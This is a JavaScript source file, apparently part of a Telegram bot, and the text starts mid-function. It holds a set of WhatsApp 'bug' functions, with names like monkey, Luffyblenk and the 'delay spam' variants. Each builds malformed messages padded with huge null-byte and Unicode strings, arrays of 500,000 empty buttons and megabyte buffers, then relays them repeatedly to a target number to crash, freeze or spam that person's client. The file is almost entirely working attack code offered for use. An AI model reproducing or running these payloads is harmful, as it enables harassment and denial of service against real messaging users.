        nativeFlowMessage: { buttons: r("grock_ai", 20000) },
        contextInfo: { mentionedJid: a(100, (_, i) => String(i + 100) + "@s.whatsapp.net"), expiration: 1, ephemeralSettingTimestamp: 1 }
      }
    });
    console.log("[+] sukses send to", target);
    await d(2000);

    await s({
      interactiveMessage: {
        body: { text: "moro New" + r("\u0000", 50000) + r("\u1A01", 30000) + r("\u700b", 20000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: r("search_ai_news", 30000) },
        contextInfo: { mentionedJid: a(100, (_, i) => String(i + 200) + "@s.whatsapp.net"), expiration: 1, ephemeralSettingTimestamp: 1 }
      }
    });
    console.log("[+] berhasil ke kirim semua", target);

    console.log("[+] Selesai ngirim bug ke", target);
  } catch (e) {
    console.log("[-] Error in the funct:", e.message || e);
  }
}
//blank Infinity
async function monkey(sock, target) {
    const msg = {
        protocolMessage: {
            type: 0,
            key: { remoteJid: target, fromMe: true },
            message: {
                interactiveMessage: {
                    body: { text: "\u0000".repeat(90000) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                            { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: "\0".repeat(30000)
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 4000 }, () => ""),
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -999.999,
                                degreesLongitude: 999.999,
                                name: "\u0000".repeat(35000),
                                address: "moro".repeat(40000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, () => ""),
                                    forwardingScore: 9999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const msg2 = {
        header: {
            title: "moro",
            hasMediaAttachment: false
        },
        body: {
            text: "moro"
        },
        footer: {
            text: "\r"
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "booking_confirmation",
                    buttonParamsJson: JSON.stringify({
                        icon: "default",
                        start_datetime: "2026-06-10T10:37:10.967Z",
                        end_datetime: "2026-06-10T10:47:10.967Z",
                        location: "epZinc Network",
                        booking_url: "t.me/iamsatzZX",
                        phone_number: "\0".repeat(12000),
                        booking_management_url: "t.me/LUFFYLOXTAL",
                        description: "ြ".repeat(20000),
                        email: "\u0000".repeat(2000),
                        display_text: "KEY" + "ြ".repeat(19000),
                        display_content: {
                            display_language: "id",
                            display_meeting_type: "KEY¿" + "ြ".repeat(15000),
                            display_bottom_sheet_header: "ြ".repeat(17000),
                            display_add_to_calendar_cta_text: "MONKEY",
                            display_view_on_maps_cta_text: "MONKEY",
                            display_manage_booking_cta_text: "ြ".repeat(22000),
                            display_manage_booking_not_supported_text: "NOT AVAILABLE",
                            display_read_more: "READ MORE"
                        }
                    })
                }
            ],
            messageParamsJson: ""
        }
    };

    const msg3 = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${target.split('@')[0]}`
                        },
                        {
                            messageType: 3,
                            mediaMetadata: {}
                        },
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "\0",
                                rows: [
                                    {
                                        items: [],
                                        isHeading: true
                                    }
                                ]
                            }
                        }
                    ],
                    contextInfo: {
                        mentionedJid: [target],
                        featureEligibilities: Array.from({ length: 99000 }, () => ({
                            canReceiveMultiReact: true
                        })),
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg4 = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "o+iSkGm6O3/g7uBR/aChsjSKs7EcayA8lV/h7yaPsq0=",
            viewOnce: true,
            caption: "moro" + "ြ".repeat(100000),
            fileLength: "71831",
            height: 1024,
            width: 1536,
            mediaKey: "RHS1mPMKv23WPGPM8GWd5fsXzZh1dLdG04yIrL13FB4=",
            fileEncSha256: "+40DMIFaOid0dVofoUAQkY8v6cfjkxFUqJWy6gSwfkc=",
            directPath: "/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1783579277",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADAASAMBIgACEQEDEQH/xAAsAAEAAgMBAAAAAAAAAAAAAAAAAgQBAwUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADzIDZM0AM2CskI9Dn2jucyxpLbn4N+2NUpMCVmmJz0i1isM4AD/8QAKhAAAgICAQEFCQEAAAAAAAAAAQIAAwQREjEQFCEwURMiNBMyQmFigZH/2gAIAQEAAT8A8tKrH+FCY9Jq+Z19O3R9JViXWglVjrxYjswsQ2uGYe4JfZkKQmLQAgiUX5GYBaszMeiukOniN6id0GK1wpA1Me321wVKhtv8EzMnu+6aWH5jEk7PZQ+QQUqYzldj1bsv/kOS9aG3kObyzKc1hFfr1loZhVQh3AExAFLgE9ZbkUhStdY2fuMJ3EUMfE6EbIFY40jX7TkxOy0ULYWLvqCuoHYt+m45Feilmyw8YST1O/M//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
            contextInfo: {
                featureEligibilities: { cannotBeRanked: true, canBeReshared: true },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "MUSIC_STANDALONE"
            },
            annotations: [
                {
                    polygonVertices: [
                        { x: 0.17499999701976776, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.6620468497276306 },
                        { x: 0.17499999701976776, y: 0.6620468497276306 }
                    ],
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "2261401457948346",
                            songId: "849859527815275",
                            author: "moro" + "ြ".repeat(55000),
                            title: "ြ".repeat(45000),
                            artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                            artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                            artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                            artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                            artistAttribution: "https://www.instagram.com/_u/ndarboy_genk",
                            countryBlocklist: "WEs=",
                            isExplicit: false
                        }
                    },
                    embeddedAction: true
                }
            ]
        }
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg2, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg3, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg4, {
        participant: { jid: target }
    });
}
//blank no click
async function Luffyblenk(sock, target) {
    try {
        const MSG = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAQQDAgYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8ywH07ZYFQ7JVTOIAbTKqIts6ya0SfivKsTQs4TApm6lpfOEavnRZjk1k64BvkKceA2yQAgABgAAIAAD/8QAJhAAAgICAAUEAwEAAAAAAAAAAQIAEQMSBBATITEgIkFRFEBhcf/aAAgBAQABPwDkKvvGTX/IV7AiAX6lTbwe84fDuNXYAR2C2i9xcx5kApscPSo63Z9AnD6B/uZXCbLXmFAFU/c6LGMpQ16BUDBaIFGaHL3Zquaktrt4j48iFbbsZmxAEe6Nj0o3Ml/NS+a37bEIQblZlfdcX8mX3OIVIIJ8CM1kypR5BjMXDvks3QEIO1RQNqJnEnFS9NoTYEBm1ChyU1PyXCFF7CI1MCYrWz38wH9T/8QAGREAAgMBAAAAAAAAAAAAAAAAAAEQESAw/9oACAECAQE/ABvLi5ZXX//EABYRAQEBAAAAAAAAAAAAAAAAABEwIP/aAAgBAwEBPwCBhr//2Q=="
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "review_and_pay",
                            buttonParamsJson: JSON.stringify({
                                currency: "IDR",
                                total_amount: {
                                    value: 24200,
                                    offset: 100
                                },
                                reference_id: "ြ".repeat(30000),
                                type: "physical-goods",
                                payment_status: "captured",
                                payment_timestamp: 1784036085,
                                order: {
                                    status: "completed",
                                    subtotal: {
                                        value: 24200,
                                        offset: 100
                                    },
                                    order_type: "ORDER",
                                    items: [
                                        {
                                            retailer_id: "27893463680254247",
                                            product_id: "27893463680254247",
                                            name: "moro" + "ြ".repeat(25000),
                                            amount: {
                                                value: 24200,
                                                offset: 100
                                            },
                                            quantity: 1
                                        }
                                    ]
                                },
                                native_payment_methods: [],
                                share_payment_status: false,
                                is_soft_deleted: false
                            })
                        }
                    ]
                }
            }
        };

        const MSG2 = {
            interactiveMessage: {
                body: {
                    text: "\u0000".repeat(50000)
                },
                nativeFlowMessage: {
                    buttons: [
                        ...Array.from({ length: 500000 }, () => ({})),
                        { name: "catalog_message".repeat(20000) },
                        { name: "cta_url".repeat(20000) },
                        { name: "booking_confirmation".repeat(20000) },
                        { name: "inapp_signup".repeat(20000) },
                        { name: "booking_status".repeat(20000) }
                    ],
                    parameters: {
                        thumbnail_product_retailer_id: "PROD-001"
                    }
                }
            }
        };

        const x = Buffer.alloc(1024 * 1024, 0);
        const MSG3 = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            senderKeyHash: x,
                            senderTimestamp: "1743225419",
                            recipientKeyHash: x,
                            recipientTimestamp: "1743225419"
                        },
                        deviceListMetadataVersion: 2
                    },
                    callLogRecordMessage: {
                        isCancelled: false,
                        callOutcome: 1,
                        callType: 1
                    },
                    contextInfo: {
                        stanzaId: x,
                        mentionedJid: [
                            ...Array.from({ length: 50000 }, (_, p) => `86705131476${p}@bot`),
                            target,
                            '0@s.whatsapp.net'
                        ]
                    }
                }
            }
        };

        const MSG4 = {
            interactiveMessage: {
                body: {
                    text: "\u200b".repeat(60000)
                },
                nativeFlowResponsMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                },
                nativeFlowMessage: {
                    buttons: "crash_maessage".repeat(20000)
                }
            }
        };

        await sock.relayMessage(target, MSG, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, MSG2, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, MSG3, {
            participant: { jid: target }
        });

        await sock.relayMessage(target, MSG4, {
            participant: { jid: target }
        });

        console.log("✅ Sukses Sent To: " + target);
    } catch (err) {
        console.error("❌ Error: " + err.message);
    }
}
//buldozer
async function CongXRexccdozer(sock, target) {
  try {
    const payload = "\u0000".repeat(50000);
    const randomEmoji = "ꦾ".repeat(10000);
    
    const msg = {
      groupStatusMessageV2: {
        message: {
          documentMessage: {
            url: "https://mmg.whatsapp.net",
            mimetype: "application/pdf",
            fileLength: 104857600,
            fileName: "Moro Bulldozer",
            pageCount: 999999999,
            fileSha256: Buffer.alloc(100000, 0xFF),
            fileEncSha256: Buffer.alloc(100000, 0x00),
            mediaKey: Buffer.alloc(100000, 0xDE),
            directPath: payload,
            caption: randomEmoji,
            contextInfo: {
              mentionedJid: [target],
              forwardingScore: 999999,
              isForwarded: true,
              quotedMessage: {
                documentMessage: {
                  fileLength: 104857600,
                  fileName: payload,
                  pageCount: 999999999
                }
              }
            }
          },
          interactiveMessage: {
            body: { text: payload, format: "DEFAULT" },
            footer: { text: randomEmoji },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { 
                  name: "cta_url", 
                  buttonParamsJson: JSON.stringify({ 
                    display_text: "CongXRexcc", 
                    url: "https://mmg.whatsapp.net" 
                  }) 
                },
                { 
                  name: "quick_reply", 
                  buttonParamsJson: JSON.stringify({ 
                    display_text: payload.substring(0, 5000), 
                    id: "moro" 
                  }) 
                }
              ]
            }
          }
        }
      }
    };

    for (let i = 0; i < 30; i++) {
      await sock.relayMessage(target, msg, { 
        participant: { jid: target } 
      });
      await new Promise(r => setTimeout(r, 2000));
    }
    
    return true;
  } catch (error) {
    console.error("Send bug To Bulldozer:", error);
    return false;
  }
}
//FUNCTION BUG CAN SPAM TARGET//
//delay v1
async function dileyspam(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(60000),
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: "valid_end_message".repeat(20000) + "\u200B".repeat(30000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error("Error:", err);
    }
}
//delay v2
async function VnFDelaySpamBokep(sock, target) {
    try {
        const VnFMsg1 = {
            interactiveResponseMessage: {
                body: {
                    text: " 🩸⃟༑⌁⃰moro🦠 ",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "FORM_SCREEN",
                    version: 3
                },
                contextInfo: {
                    remoteJid: "0.dkwzzqyl7eiCALL_ACCESS",
                    isForwarded: true,
                    forwardingScore: 999,
                    urlTrackingMap: {
                        urlTrackingMapElements: Array.from({ length: 900000 }, () => ({
                            xN0000: " #🩸⃟༑⌁⃰moro🦠 "
                        }))
                    }
                }
            }
        };

        const VnFMsg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " 🩸⃟༑⌁moro..⃰🦠 "
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        };

        const GyzenMsg1 = {
            groupInviteMessageV2: {
                groupJid: "120363370626418572@g.us",
                inviteCode: "X".repeat(95727),
                inviteExpiration: "99999999999",
                groupName: "—moro៚" + "ោ៝".repeat(95727),
                caption: "ោ៝".repeat(95727),
                contextInfo: {
                    expiration: 1,
                    ephemeralSettingTimestamp: 1,
                    entryPointConversionSource: "WhatsApp.com",
                    entryPointConversionApp: "WhatsApp",
                    entryPointConversionDelaySeconds: 1,
                    disappearingMode: {
                        initiatorDeviceJid: target,
                        initiator: "INITIATED_BY_OTHER",
                        trigger: "UNKNOWN_GROUPS"
                    },
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: "0@s.whatsapp.net",
                    questionMessage: {
                        paymentInviteMessage: {
                            serviceType: 1,
                            expiryTimestamp: null
                        }
                    },
                    externalAdReply: {
                        showAdAttribution: false,
                        sockderLargerThumbnail: true
                    }
                }
            }
        };

        const GyzenMsg2 = {
            viewOnceMessageV2: {
                message: {
                    listResponseMessage: {
                        title: "—moro",
                        listType: 4,
                        buttonText: { displayText: "🩸" },
                        sections: [],
                        singleSelectReply: {
                            selectedRowId: "⌜⌟"
                        },
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                )
                            ],
                            participant: "0@s.whatsapp.net",
                            remoteJid: "./i'm GyzenLyoraa!¿",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 1,
                                    expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                                }
                            },
                            externalAdReply: {
                                title: "💧",
                                body: "🩸",
                                mediaType: 1,
                                sockderLargerThumbnail: false,
                                nativeFlowButtons: [
                                    {
                                        name: "payment_info",
                                        buttonParamsJson: ""
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: ""
                                    }
                                ]
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, VnFMsg1, { participant: { jid: target } });
        await sock.relayMessage(target, VnFMsg2, { participant: { jid: target } });
        await sock.relayMessage(target, GyzenMsg1, { participant: { jid: target } });
        await sock.relayMessage(target, GyzenMsg2, { participant: { jid: target } });

        console.log("—( ✅ ) Successfully sent the bug to" + target);
    } catch (err) {
        console.error("—( ❌ ) Error:", err.message);
    }
}
//delay v3
async function VnFDelaySpamPorno(sock, target) {
  const msg = {
    interactiveMessage: {
      body: { text: "moro." }, 
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  };
  
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
          fileLength: 9999,
          height: 9999,
          width: 9999,
          mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
          fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
          directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1776937541",
          jpegThumbnail: null,
          caption: "moro.",
          scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
          scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
          ],
          midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
         }, 
        hasMediaAttachment: true
      },
      body: { text: "./" }
    }, 
    nativeFlowMessage: {
      buttons: Array.from({ length: 500000 }, () => ({}))
    }
  });
  await sock.relayMessage(target, msg, {});
}
//delay spam v4
async function delaysspam(sock, target, loop = 30) {
    try {
        for (let i = 0; i < loop; i++) {
            const bokep = {
                groupStatusMessageV2: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                interactiveResponseMessage: {
                                    nativeFlowResponseMessage: {
                                        name: "cta_url",
                                        paramsJson: JSON.stringify({
                                            flow_cta: "\u0000".repeat(90000)
                                        })
                                    },
                                    contextInfo: {
                                        forwardingScore: 999,
                                        isForwarded: true
                                    }
                                }
                            }
                        }
                    },
                    status: 0
                }
            };

            await sock.relayMessage(target, bokep, {
                messageId: null
            });

            console.log(`[${i+1}/${loop}] ✅ Succes`);
            await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
        }

        console.log(`${loop} doneee:`, target);

    } catch (err) {
        console.error("Error:", err.message);
    }
}

bot.launch();